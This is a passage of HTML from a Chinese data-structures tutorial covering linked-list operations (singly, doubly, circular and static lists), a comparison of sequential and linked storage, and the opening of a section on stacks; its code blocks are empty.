stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
<details class="hint-container details"><summary>扩展：对某一结点进行前插操作</summary>
<p><strong>前插操作</strong> 是指在某结点的前面插入一个新结点，后插操作的定义刚好与之相反。在单链表插入算法中，通常都采用后插操作。</p>
<p>以上面的算法为例，首先调用函数 <code>GetElem()</code> 找到第 <code>i - 1</code> 个结点，即插入结点的前驱结点后，再对其执行后插操作。由此可知，对结点的前插操作均可转化为后插操作，前提是从单链表的头结点开始顺序查找到其前驱结点，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>此外，可采用另一种方式将其转化为后插操作来实现，设待插入结点为 <code>*s</code>；将 <code>*s</code> 插入到 <code>*p</code> 的前面。仍然将 <code>*s</code> 插入到 <code>*p</code> 的后面，然后将 <code>p-&gt;data</code> 与 <code>data</code> 交换，这样既满足了逻辑关系，又能使得时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。<strong>算法的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
</li>
<li>
<p><strong>删除结点操作</strong></p>
<p>删除结点操作是将单链表的第 <code>i</code> 个结点删除。先检查删除位置的合法性，后查找表中第 <code>i - 1</code> 个结点，即被删结点的前驱结点，再将其删除。其操作过程如下图所示。</p>
<figure><figcaption>删除单链表</figcaption></figure>
<p>假设结点 <code>*p</code> 为找到的被删结点的前驱结点，为实现这一操作后的逻辑关系的变化，仅需修改 <code>*p</code> 的指针域，即将 <code>*p</code> 的指针域 <code>next</code> 指向 <code>*q</code> 的下一结点。</p>
<p><strong>实现删除结点的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>和插入算法一样，该算法的主要时间也耗费在查找操作上，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<details class="hint-container details"><summary>扩展：删除结点 *P</summary>
<p>要删除某个给定结点 <code>*P</code>，通常的做法是先从链表的头结点开始顺序找到其前驱结点，然后执行删除操作，算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>其实，删除结点 <code>*p</code> 的操作可用删除 <code>*p</code> 的后继结点操作来实现，实质就是将其后继结点的值赋予其自身，然后删除后继结点，也能使得时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
<p><strong>实现上述操作的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
</li>
<li>
<p><strong>求表长操作</strong></p>
<p>求表长操作就是计算单链表中数据结点（不含头结点）的个数，需要从第一个结点开始顺序依次访问表中的每个结点，为此需要设置一个计数器变量，每访问一个结点，计数器加 <code>1</code>，直到访问到空结点为止。算法的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>需要注意的是，因为单链表的长度是不包括头结点的，因此不带头结点和带头结点的单链表在求表长操作上会略有不同。对不带头结点的单链表，当表为空时，要单独处理。</p>
</li>
</ol>
<h4> 双链表</h4>
<p>单链表结点中只有一个指向其后继的指针，使得单链表只能从头结点依次顺序地向后遍历。要访问某个结点的前驱结点（插入、删除操作时），只能从头开始遍历，访问后继结点的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，访问前驱结点的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>为了克服单链表的上述缺点，引入了双链表，双链表结点中有两个指针 <code>prior</code> 和 <code>next</code>，分别指向其前驱结点和后继结点，如下图所示。</p>
<figure><figcaption>双链表</figcaption></figure>
<p><strong>双链表中结点类型的描述如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>双链表在单链表的结点中增加了一个指向其前驱的 <code>prior</code> 指针，因此双链表中的按值查找和按位查找的操作与单链表的相同。但双链表在插入和删除操作的实现上，与单链表有着较大的不同。这是因为 “链” 变化时也需要对 <code>prior</code> 指针做出修改，其关键是保证在修改的过程中不断链。此外，双链表可以很方便地找到其前驱结点，因此，插入、删除操作的时间复杂度仅为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p>
<ol>
<li>
<p><strong>双链表的插入操作</strong></p>
<p>在双链表中 <code>p</code> 所指的结点之后插入结点 <code>*s</code>，其指针的变化过程如下图所示。</p>
<figure><figcaption>插入双链表</figcaption></figure>
<p><strong>插入操作的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上述代码的语句顺序不是唯一的，但也不是任意的，<code>1</code> 和 <code>2</code> 两步必须在 <code>4</code> 步之前，否则 <code>*p</code> 的后继结点的指针就会丢掉，导致插入失败。</p>
</li>
<li>
<p><strong>双链表的删除操作</strong></p>
<p>删除双链表中结点 <code>*p</code> 的后继结点 <code>*q</code>，其指针的变化过程如下图所示。</p>
<figure><figcaption>删除双链表</figcaption></figure>
<p><strong>删除操作的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在建立双链表的操作中，也可采用如同单链表的头插法和尾插法，但在操作上需要注意指针的变化和单链表有所不同。</p>
</li>
</ol>
<h4> 循环链表</h4>
<ol>
<li>
<p><strong>循环单链表</strong></p>
<p>循环单链表和单链表的区别在于，表中最后一个结点的指针不是 <code>NULL</code>，而改为指向头结点，从而整个链表形成一个环，如下图所示。</p>
<figure><figcaption>循环单链表</figcaption></figure>
<p>在循环单链表中，表尾结点 <code>*r</code> 的 <code>next</code> 域指向 <code>L</code>，故表中没有指针域为 <code>NULL</code> 的结点，因此，循环单链表的判空条件不是头结点的指针是否为空，而是它是否等于头指针。</p>
<p>循环单链表的插入、删除算法与单链表的几乎一样，所不同的是若操作是在表尾进行，则执行的操作不同，以让单链表继续保持循环的性质。当然，正是因为循环单链表是一个 “环”，因此在任何一个位置上的插入和删除操作都是等价的，无须判断是否是表尾。</p>
<p>在单链表中只能从表头结点开始往后顺序遍历整个链表，而循环单链表可以从表中的任意一个结点开始遍历整个链表。有时对循环单链表不设头指针而仅设尾指针，以使得操作效率更高。其原因是，若设的是头指针，对在表尾插入元素需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的时间复杂度，而若设的是尾指针 <code>r</code>，<code>r-&gt;next</code> 即为头指针，对在表头或表尾插入元素都只需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的时间复杂度。</p>
</li>
<li>
<p><strong>循环双链表</strong></p>
<p>由循环单链表的定义不难推出循环双链表。不同的是在循环双链表中，头结点的 <code>prior</code> 指针还要指向表尾结点，如下图所示。</p>
<figure><figcaption>循环双链表</figcaption></figure>
<p>在循环双链表 <code>L</code> 中，某结点 <code>*p</code> 为尾结点时，<code>p-&gt;next == L</code>；当循环双链表为空表时，其头结点的 <code>prior</code> 域和 <code>next</code> 域都等于 <code>L</code>。</p>
</li>
</ol>
<h4> 静态链表</h4>
<p>静态链表借助数组来描述线性表的链式存储结构，结点也有数据域 <code>data</code> 和指针域 <code>next</code>，与前面所讲的链表中的指针不同的是，这里的指针是结点的相对地址（数组下标），又称游标。和顺序表一样，静态链表也要预先分配一块连续的内存空间。</p>
<p>静态链表和单链表的对应关系如下图所示。</p>
<figure><figcaption>静态链表</figcaption></figure>
<p><strong>静态链表结构类型的描述如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>静态链表以 <code>next == -1</code> 作为其结束的标志。静态链表的插入、删除操作与动态链表的相同，只需要修改指针，而不需要移动元素。总体来说，静态链表没有单链表使用起来方便，但在一些不支持指针的高级语言（如：Basic）中，这是一种非常巧妙的设计方法。</p>
<h3> 顺序表和链表的比较</h3>
<ol>
<li>
<p><strong>存取（读写）方式</strong></p>
<p>顺序表可以顺序存取，也可以随机存取，链表只能从表头顺序存取元素。例如：在第 <code>i</code> 个位置上执行存或取的操作，顺序表仅需一次访问，而链表则需从表头开始依次访问 <code>i</code> 次。</p>
</li>
<li>
<p><strong>逻辑结构与物理结构</strong></p>
<p>采用顺序存储时，逻辑上相邻的元素，对应的物理存储位置也相邻。而采用链式存储时，逻辑上相邻的元素，物理存储位置不一定相邻，对应的逻辑关系是通过指针链接来表示的。</p>
</li>
<li>
<p><strong>查找、插入和删除操作</strong></p>
<p>对于按值查找，顺序表无序时，两者的时间复杂度均为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>；顺序表有序时，可采用折半查找，此时的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>对于按序号查找，顺序表支持随机访问，时间复杂度仅为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，而链表的平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。顺序表的插入、删除操作，平均需要移动半个表长的元素。链表的插入、删除操作，只需修改相关结点的指针域即可。由于链表的每个结点都带有指针域，故而存储密度不够大。</p>
</li>
<li>
<p><strong>空间分配</strong></p>
<p>顺序存储在静态存储分配情形下，一旦存储空间装满就不能扩充，若再加入新元素，则会出现内存溢出，因此需要预先分配足够大的存储空间。预先分配过大，可能会导致顺序表后部大量闲置；预先分配过小，又会造成溢出。动态存储分配虽然存储空间可以扩充，但需要移动大量元素，导致操作效率降低，而且若内存中没有更大块的连续存储空间，则会导致分配失败。链式存储的结点空间只在需要时申请分配，只要内存有空间就可以分配，操作灵活、高效。</p>
</li>
</ol>
<p><strong>在实际中选取存储结构需考虑以下几点：</strong></p>
<ol>
<li>
<p><strong>基于存储的考虑</strong></p>
<p>难以估计线性表的长度或存储规模时，不宜采用顺序表；链表不用事先估计存储规模，但链表的存储密度较低，显然链式存储结构的存储密度是小于 <code>1</code> 的。</p>
</li>
<li>
<p><strong>基于运算的考虑</strong></p>
<p>在顺序表中按序号访问 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，而链表中按序号访问的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，因此若经常做的运算是按序号访问数据元素，则显然顺序表优于链表。</p>
<p>在顺序表中进行插入、删除操作时，平均移动表中一半的元素，当数据元素的信息量较大且表较长时，这一点是不应忽视的；在链表中进行插入、删除操作时，虽然也要找插入位置，但操作主要是比较操作，从这个角度考虑显然后者优于前者。</p>
</li>
<li>
<p><strong>基于环境的考虑</strong></p>
<p>顺序表容易实现，任何高级语言中都有数组类型；链表的操作是基于指针的，相对来讲，前者实现较为简单，这也是用户考虑的一个因素。</p>
</li>
</ol>
<p>总之，两种存储结构各有长短，选择哪一种由实际问题的主要因素决定。通常较稳定的线性表选择顺序存储，而频繁进行插入、删除操作的线性表（即动态性较强）宜选择链式存储。</p>
<h2> 栈、队列和数组</h2>
<h3> 栈</h3>
<h4> 栈的基本概念</h4>
<ol>
<li>
<p><strong>栈的定义</strong></p>
<p>栈（Stack）是 <strong>只允许在一端进行插入或删除操作的线性表</strong>。首先栈是一种线性表，但限定这种线性表只能在某一端进行插入和删除操作。</p>
<ul>
<li><strong>栈顶（Top）</strong>：线性表允许进行插入删除的那一端</li>
<li><strong>栈底（Bottom）</strong>：固定的，不允许进行插入和删除的另一端</li>
<li><strong>空栈</strong>：不含任何元素的空表</li>
</ul>
<p>假设某个栈 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S = (a_{1}, a_{2}, a_{3}, a_{4}, a_{5})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为栈底元素，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">a_{5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为栈顶元素。由于栈只能在栈顶进行插入和删除操作，进次序依次为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">a_{1}, a_{2}, a_{3}, a_{4}, a_{5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span 